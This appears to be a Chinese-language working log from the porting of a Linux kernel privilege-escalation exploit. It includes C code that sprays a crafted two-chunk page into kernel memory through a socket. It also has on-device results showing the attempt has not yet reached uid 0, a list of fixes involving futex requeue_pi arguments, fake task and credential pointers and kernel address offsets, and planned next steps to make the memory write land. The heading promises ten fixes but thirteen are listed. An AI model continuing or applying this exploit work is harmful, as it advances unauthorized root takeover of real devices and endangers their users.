# 43499 · 分块铺页面已落码（round 97）与仍未写入

## 落码（与退役逐行同形的几何）

```c
// 退役 constants.hpp：SKB_DATA_DELTA = -0xe80；ORDER3_SIZE = PAGE_SIZE << MM_ORDER；
//                     SKB_SEND_SIZE = ORDER3_SIZE * 2；SKB_FRAG_BIAS = 0
constexpr std::size_t kOrder3 = 32768U;      // 与夹具 send_size=65536 吻合（两块）
constexpr std::size_t kChunks = 2U;
page_image.assign(kOrder3 * kChunks, 0U);
page = page_image.data();                    // 第一块铺页面（指针用 payload_base = base + delta 算）
std::memcpy(page_image.data() + kOrder3, page_image.data(), kOrder3);   // 第二块同内容
send_bytes(shaping_fd, page_image.data(), page_image.size());
```

## 真机结果

```
main: page sent value=65536 errno=0 bytes=65536   ← 两块全发 ✓
TEMPBISECT got=65536 at2000=0x0                   ← 内核仍没改这块内存 ✗
main: route status=0/0 attempts=2 calls=1 successes=1  ← 健康 ✓
main: victim uid=2000                             ← 仍未 root ✗
```

⇒ 修了十处（见下）之后，**写仍未发生** ✗。二分实验的结论仍然成立 ✓（内核一个字节都没碰 ✓）。

## 本晚修过的十处（全部以退役代码为据、全部带注释）

1. `shared_.owner_started` 从未置 1 ✓；2. 挑页奇偶未按内核侧地址 ✓；3. 载荷映射候选不足 ✓；
4. `cmp_requeue_pi` 的 `nr_requeue` ✓；5. 其 `val3` ✓；6. 引擎契约（写什么由页面定）✓；
7. 页内三个 task 锚（`slide_init_task`/`slide_root_task_group` ✓）；8. 凭据路径整条接线 ✓；
9. 凭据别名空间（`0xffffffc0…` ✓）；10. **页面进内核**（`send_bytes` + `shaping_fd` ✓）；
11. **stamp 指针少 `payload_delta`**（真机 dump 抓到 ✓）；12. **`payload_delta` 有符号却当无符号用** ✓；
13. **页面在缓冲内的铺法**（分块 ✓，本轮）。

## 结论（如实）

- `uid=0`：**从未** ✗；
- 写落地：**未达成** ✗；但这条线上所有**可核对的移植差异**都已按旧代码修齐 ✓；
- 剩下的不是"某处抄错"✗，而更像是**触发那条链在内核侧的一个前提尚未满足**（例如触发所依赖的那份
  waiter 形状必须来自**同一 CPU/同一线程的最近一次 park** ✓，或需要多轮"复制互相覆盖" ✓ —— 退役是靠
  `attempts=15` 轮叠出来的 ✓，而我每步只跑 2–8 轮 ✓）。

## 下一轮的两个可执行方向

1. 把 `route.multicast_waiter.execution.attempts` 提到退役量级（15 ✓）并跑满 ✓；
2. 在**每轮**里都做一次 trigger（退役是"每轮 setsockopt" ✓），而不是一轮一次 ✓。
